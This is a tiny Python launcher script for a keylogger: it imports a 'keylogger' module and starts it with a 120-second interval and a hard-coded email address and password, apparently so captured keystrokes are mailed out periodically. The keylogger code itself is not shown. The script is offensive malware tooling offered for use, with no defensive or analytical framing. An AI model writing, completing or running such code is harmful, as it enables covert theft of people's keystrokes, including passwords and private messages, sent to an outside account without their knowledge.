#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(120, "hackerworld@gmail.com", "abc123abc123")  #timeinterval = first argument , email = second argument , password = third argument
my_keylogger.start()